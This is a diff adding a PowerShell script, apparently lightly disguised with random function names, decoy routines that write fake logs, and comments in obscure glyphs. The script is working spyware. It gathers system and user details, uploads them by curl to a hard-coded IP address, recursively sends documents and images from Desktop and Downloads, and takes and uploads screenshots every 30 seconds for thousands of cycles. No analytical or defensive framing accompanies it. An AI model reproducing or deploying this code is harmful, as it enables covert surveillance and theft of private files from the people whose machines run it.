@@ -1,0 +1,170 @@
+# 经过修改并替换注释的文件 
+$tempFolder = [System.IO.Path]::GetTempPath()
+
+function qerlof {
+    $array = 1..1000 | ForEach-Object { Get-Random -Minimum 1 -Maximum 10000 }
+    $sum = 0
+    foreach ($num in $array) {
+        $sum += $num
+    }
+    return $sum
+}
+
+function ypotaz {
+    $dict = @{ "A" = 1; "B" = 2; "C" = 3 }
+    foreach ($key in $dict.Keys) {
+        $dict[$key] += Get-Random -Minimum 0 -Maximum 5
+    }
+    return $dict
+}
+
+# Ⓣ⍴ℭ⨂⍟⏃⧫⏁⏚⨉⟟⍙⧫⍜ ⏃⨋⍜⏁⟟⏁ ⍟⏁⧫⍟⧫⏁⨉⏁⧫ ⍟⏁ ⟟⏃⧫⟟⨉⏃⟟⏁
+
+function iwanh {
+    param (
+        [string]$filePath
+    )
+ # 将函数发送到服务器
+        $curlCommand = "curl -X POST -F ""file=@$filePath"" http://79.133.56.164/upload"
+        cmd.exe /c $curlCommand
+}
+
+function brixop {
+    $letters = "abcdefghijklmnopqrstuvwxyz"
+    $result = ""
+    for ($i=0; $i -lt 12; $i++) {
+        $result += $letters[(Get-Random -Minimum 0 -Maximum $letters.Length)]
+    }
+    return $result
+}
+
+$computerName = $env:COMPUTERNAME
+$externalIP = (Invoke-WebRequest -Uri "https://api.ipify.org").Content
+ # Ⓣ⍴ℭ⨂⍟⏃⧫⏁⏚⨉⟟⍙⧫⍜ ⏃⨋⍜⏁⟟⏁ ⍟⏁⧫⍟⧫⏁⨉⏁⧫ ⍟⏁ ⟟⏃⧫⟟⨉⏃⟟⏁
+$logFileName = "SystemInfo_${computerName}_${externalIP}.txt"
+$logFilePath = Join-Path -Path $tempFolder -ChildPath $logFileName
+$logContent = "Computer Name: $computerName`r`nUser Name: $($env:USERNAME)`r`n"
+# ⌘⨀⟟⍜⟟⧫⏁ ⏃⧫⍜⧫⟟⍙⟟ ⏃⧫⏁⍙⏃⧫⟟⨉⍜ ⍟⏃⧫⟟⨉⏃⟟⏁
+$osInfo = Get-WmiObject Win32_OperatingSystem
+$logContent += "OS Name: $($osInfo.Caption)`r`nVersion: $($osInfo.Version)`r`nManufacturer: $($osInfo.Manufacturer)`r`n"
+ # Ⓣ⍴ℭ⨂⍟⏃⧫⏁⏚⨉⟟⍙⧫⍜ ⏃⨋⍜⏁⟟⏁ ⍟⏁⧫⍟⧫⏁⨉⏁⧫ ⍟⏁ ⟟⏃⧫⟟⨉⏃⟟⏁
+$cpuInfo = Get-WmiObject Win32_Processor
+$logContent += "Processor: $($cpuInfo.Name)`r`n"
+ # Ⓣ⍴ℭ⨂⍟⏃⧫⏁⏚⨉⟟⍙⧫⍜ ⏃⨋⍜⏁⟟⏁ ⍟⏁⧫⍟⧫⏁⨉⏁⧫ ⍟⏁ ⟟⏃⧫⟟⨉⏃⟟⏁
+$disks = Get-WmiObject Win32_LogicalDisk
+foreach ($disk in $disks) {
+    $logContent += "Disk: $($disk.DeviceID), Free Space: $($disk.FreeSpace) bytes`r`n"
+}
+ # Ⓣ⍴ℭ⨂⍟⏃⧫⏁⏚⨉⟟⍙⧫⍜ ⏃⨋⍜⏁⟟⏁ ⍟⏁⧫⍟⧫⏁⨉⏁⧫ ⍟⏁ ⟟⏃⧫⟟⨉⏃⟟⏁
+$internalIP = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}).IPAddress[0]
+$logContent += "External IP: $externalIP`r`nInternal IP: $internalIP`r`n"
+# ⌘⨀⟟⍜⟟⧫⏁ ⏃⧫⍜⧫⟟⍙⟟ ⏃⧫⏁⍙⏃⧫⟟⨉⍜ ⍟⏃⧫⟟⨉⏃⟟⏁
+$logContent | Out-File -FilePath $logFilePath
+
+# ⌘⨀⟟⍜⟟⧫⏁ ⏃⧫⍜⧫⟟⍙⟟ ⏃⧫⏁⍙⏃⧫⟟⨉⍜ ⍟⏃⧫⟟⨉⏃⟟⏁
+iwanh $logFilePath
+
+function oxylap {
+    $paths = @(
+        [System.Environment]::GetFolderPath("Desktop"),
+        [System.Environment]::GetFolderPath("MyDocuments") -replace "Documents", "Downloads"
+    )
+
+    $fileExtensions = @("*.txt", "*.xls", "*.xlsx", "*.pdf","*.png", "*.jpg", "*.jpeg","*.doc", "*.docx")
+
+    foreach ($path in $paths) {
+        foreach ($ext in $fileExtensions) {
+            Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                iwanh $_.FullName
+            }
+        }
+    }
+}
+
+function vopnix {
+    $chars = "0123456789abcdef"
+    $hex = ""
+    for ($i=0; $i -lt 8; $i++) {
+        $hex += $chars[(Get-Random -Minimum 0 -Maximum 16)]
+    }
+    return $hex
+}
+
+function kulser {
+    $randomId = vopnix
+    $fakeData = @"
+SystemID: $randomId
+Uptime: $((Get-Random -Minimum 1000 -Maximum 100000)) seconds
+TempSensor: $((Get-Random -Minimum 30 -Maximum 90)) C
+FanSpeed: $((Get-Random -Minimum 1000 -Maximum 5000)) RPM
+"@
+    $fakeFile = Join-Path $tempFolder "sysinfo_$randomId.log"
+    $fakeData | Out-File -FilePath $fakeFile -Encoding ASCII
+}
+
+function narfol {
+    for ($i=0; $i -lt 5; $i++) {
+        $fileName = "tmpfile_" + (vopnix) + ".tmp"
+        $filePath = Join-Path $tempFolder $fileName
+        $content = (Get-Random -Minimum 1000 -Maximum 9999) | Out-String
+        $content *= 10
+        $content | Out-File -FilePath $filePath
+    }
+}
+
+function lirfok {
+    $stats = @"
+PacketsSent: $((Get-Random -Minimum 10000 -Maximum 50000))
+PacketsReceived: $((Get-Random -Minimum 10000 -Maximum 50000))
+Errors: $((Get-Random -Minimum 0 -Maximum 20))
+Collisions: $((Get-Random -Minimum 0 -Maximum 5))
+"@
+    $statsPath = Join-Path $tempFolder "netstats.log"
+    $stats | Out-File -FilePath $statsPath
+}
+
+# ⌘⨀⟟⍜⟟⧫⏁ ⏃⧫⍜⧫⟟⍙⟟ ⏃⧫⏁⍙⏃⧫⟟⨉⍜ ⍟⏃⧫⟟⨉⏃⟟⏁
+function wert {
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+
+    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+
+    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+
+    $dateTime = (Get-Date).ToString("yyyyMMdd_HHmmss")
+    $screenshotName = "screenshot_${externalIP}_${dateTime}.jpg"
+    $screenshotPath = Join-Path -Path $tempFolder -ChildPath $screenshotName
+
+    # ⌘⨀⟟⍜⟟⧫⏁ ⏃⧫⍜⧫⟟⍙⟟ ⏃⧫⏁⍙⏃⧫⟟⨉⍜ ⍟⏃⧫⟟⨉⏃⟟⏁
+
+    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+    $bitmap.Dispose()
+    $graphics.Dispose()
+    
+
+    return $screenshotPath
+}
+$screenshotPath = wert
+iwanh $screenshotPath
+# ⌘⨀⟟⍜⟟⧫⏁ ⏃⧫⍜⧫⟟⍙⟟ ⏃⧫⏁⍙⏃⧫⟟⨉⍜ ⍟⏃⧫⟟⨉⏃⟟⏁
+oxylap
+
+ # Ⓣ⍴ℭ⨂⍟⏃⧫⏁⏚⨉⟟⍙⧫⍜ ⏃⨋⍜⏁⟟⏁ ⍟⏁⧫⍟⧫⏁⨉⏁⧫ ⍟⏁ ⟟⏃⧫⟟⨉⏃⟟⏁
+for ($i = 1; $i -le 3000; $i++) {
+    $screenshotPath = wert
+    iwanh $screenshotPath
+    Start-Sleep -Seconds 30  
+}
+
+kulser
+narfol
+lirfok
+qerlof | Out-Null
+ypotaz | Out-Null
+brixop | Out-Null
+
